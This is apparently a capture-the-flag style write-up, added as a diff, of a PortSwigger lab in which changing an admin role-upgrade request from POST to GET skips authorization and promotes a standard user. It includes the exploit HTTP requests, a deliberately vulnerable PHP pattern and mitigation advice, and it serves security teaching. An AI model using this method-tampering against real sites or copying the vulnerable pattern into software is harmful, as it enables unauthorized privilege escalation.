@@ -1,0 +1,451 @@
+# Method-Based Access Control Bypass
+
+**Lab:** Method-based access control can be circumvented  
+**Category:** Broken Access Control  
+**Difficulty:** Apprentice  
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application restricts administrative functionality based on the user's privileges. However, authorization is only enforced when the request uses the expected HTTP method (`POST`).
+
+By changing the request method to `GET`, the server fails to perform the authorization check while still executing the privileged action. This allows a low-privileged user to promote their own account to administrator.
+
+---
+
+# Vulnerability Classification
+
+| Attribute | Value |
+|-----------|-------|
+| Vulnerability | Method-Based Access Control Bypass |
+| CWE | CWE-285 – Improper Authorization |
+| CWE | CWE-862 – Missing Authorization |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+| Severity | High |
+| CVSS v3.1 | 8.8 (High) |
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy Lab
+
+**Affected Endpoint**
+
+```http
+/admin-roles
+```
+
+> *The exact endpoint name may vary depending on the lab instance.*
+
+---
+
+# Objective
+
+Bypass the authorization mechanism protecting the role management functionality and promote the low-privileged user to administrator.
+
+---
+
+# Methodology
+
+1. Authenticate as the administrator.
+2. Capture the request used to promote a user.
+3. Authenticate as a standard user.
+4. Replay the administrative request.
+5. Observe the authorization failure.
+6. Modify the HTTP method.
+7. Convert the request to `GET`.
+8. Change the target username.
+9. Execute the privileged action.
+
+---
+
+# Initial Enumeration
+
+After logging in as the administrator, the administration panel exposed a function to promote users.
+
+Selecting **Upgrade user** generated a request similar to:
+
+```http
+POST /admin-roles HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<ADMIN_SESSION>
+
+username=carlos&action=upgrade
+```
+
+The request was sent to **Burp Repeater** for further analysis.
+
+---
+
+# Authorization Validation
+
+A second browser session was opened using the low-privileged account.
+
+The administrator session cookie was replaced with the standard user's session.
+
+Modified request:
+
+```http
+POST /admin-roles HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+
+username=carlos&action=upgrade
+```
+
+Response:
+
+```http
+HTTP/2 401 Unauthorized
+```
+
+This confirmed that authorization was correctly enforced for `POST` requests.
+
+---
+
+# Testing HTTP Method Validation
+
+The HTTP method was changed from:
+
+```http
+POST
+```
+
+to:
+
+```http
+POSTX
+```
+
+The application returned:
+
+```text
+Missing parameter
+```
+
+instead of:
+
+```text
+Unauthorized
+```
+
+This indicated that the authorization logic depended on the HTTP method and was no longer executed.
+
+---
+
+# Exploitation
+
+Burp Suite's **Change request method** feature was used to convert the request into a `GET` request.
+
+Original request:
+
+```http
+POST /admin-roles HTTP/2
+
+username=carlos&action=upgrade
+```
+
+Converted request:
+
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+```
+
+The target username was modified from:
+
+```text
+carlos
+```
+
+to:
+
+```text
+wiener
+```
+
+The request was resent.
+
+The server executed the privileged operation successfully despite the authenticated user lacking administrative privileges.
+
+The laboratory was solved.
+
+---
+
+# Technical Analysis
+
+The application appears to authorize requests only when the request method is `POST`.
+
+Conceptually, the implementation behaves similarly to:
+
+```php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    requireAdmin();
+}
+
+upgradeUser($_REQUEST['username']);
+```
+
+When using `POST`:
+
+```text
+POST
+ │
+ ▼
+Authorization Check
+ │
+ ▼
+Unauthorized
+```
+
+When using `GET`:
+
+```text
+GET
+ │
+ ▼
+Authorization skipped
+ │
+ ▼
+upgradeUser()
+ │
+ ▼
+Privilege escalation
+```
+
+Because the application accepts parameters from `$_REQUEST`, the business logic executes regardless of the HTTP method.
+
+---
+
+# Root Cause
+
+Authorization was implemented based on the expected HTTP method instead of protecting the underlying business functionality.
+
+The privileged operation remained accessible through alternative HTTP methods.
+
+---
+
+# Impact
+
+An attacker can:
+
+- Bypass authorization checks.
+- Escalate privileges.
+- Promote arbitrary users.
+- Execute administrative actions.
+- Gain full administrative access.
+- Completely compromise the application.
+
+---
+
+# HTTP Evidence
+
+## Original Administrative Request
+
+```http
+POST /admin-roles HTTP/2
+Host: LAB-ID.web-security-academy.net
+
+username=carlos&action=upgrade
+```
+
+---
+
+## Replay Using Standard User
+
+```http
+POST /admin-roles HTTP/2
+Cookie: session=<USER_SESSION>
+
+username=carlos&action=upgrade
+```
+
+Response:
+
+```http
+HTTP/2 401 Unauthorized
+```
+
+---
+
+## Method Manipulation
+
+```http
+POSTX /admin-roles HTTP/2
+```
+
+Response:
+
+```text
+Missing parameter
+```
+
+This suggested that the authorization middleware was no longer executed.
+
+---
+
+## Final Exploit
+
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+```
+
+The request succeeded and promoted the user.
+
+---
+
+# Attack Flow
+
+```text
+Attacker logs in as administrator
+            │
+            ▼
+Captures role promotion request
+            │
+            ▼
+Logs in as low-privileged user
+            │
+            ▼
+Replays POST request
+            │
+            ▼
+401 Unauthorized
+            │
+            ▼
+Convert request to GET
+            │
+            ▼
+Authorization bypassed
+            │
+            ▼
+Privilege escalation
+            │
+            ▼
+User becomes administrator
+```
+
+---
+
+# Root Cause Diagram
+
+```text
+Incoming Request
+       │
+       ▼
+Is method POST?
+   │           │
+  Yes          No
+   │           │
+   ▼           ▼
+Check Admin    Skip Authorization
+   │           │
+   ▼           ▼
+Execute Action Execute Action
+```
+
+---
+
+# Security Recommendations
+
+## Protect Resources, Not Methods
+
+Authorization must be applied regardless of the HTTP method used.
+
+Example:
+
+```text
+Every request
+        │
+        ▼
+Authentication
+        │
+        ▼
+Authorization
+        │
+        ▼
+Execute business logic
+```
+
+---
+
+## Restrict Allowed Methods
+
+Endpoints should explicitly reject unexpected methods.
+
+Example:
+
+```http
+405 Method Not Allowed
+```
+
+for any method other than the intended one.
+
+---
+
+## Apply Authorization Inside Business Logic
+
+Do not rely solely on middleware associated with specific HTTP verbs.
+
+Critical operations should always verify the authenticated user's permissions before execution.
+
+---
+
+## Follow REST Principles
+
+Use HTTP methods consistently:
+
+- GET → Read-only
+- POST → Create
+- PUT/PATCH → Update
+- DELETE → Delete
+
+Never allow state-changing operations through `GET`.
+
+---
+
+## Perform Authorization Testing
+
+Include security testing for:
+
+- HTTP method tampering.
+- Alternative HTTP verbs.
+- Method override headers.
+- Privilege escalation.
+- Broken Access Control.
+
+---
+
+# References
+
+- OWASP Top 10 2021 – A01: Broken Access Control
+- CWE-285 – Improper Authorization
+- CWE-862 – Missing Authorization
+- PortSwigger Web Security Academy – Access Control Vulnerabilities
+
+---
+
+# Conclusion
+
+The application was vulnerable to a **Method-Based Access Control Bypass** because authorization was enforced only for the expected HTTP method.
+
+By converting the administrative request from `POST` to `GET`, the application skipped the authorization check while still executing the privileged business logic. This allowed a standard user to promote their own account to administrator, demonstrating how inconsistent authorization across HTTP methods can lead to complete privilege escalation.
+
+---
+
+## Key Takeaways
+
+- Authorization must protect business operations, not individual HTTP methods.
+- Every state-changing request must enforce server-side authorization.
+- Unexpected HTTP methods should be rejected with `405 Method Not Allowed`.
+- Never assume that using a specific HTTP verb is sufficient to protect sensitive functionality.
+- Broken Access Control remains one of the most critical and impactful web application vulnerabilities.
+
+---
+
+**Lab Status:** ✅ Solved
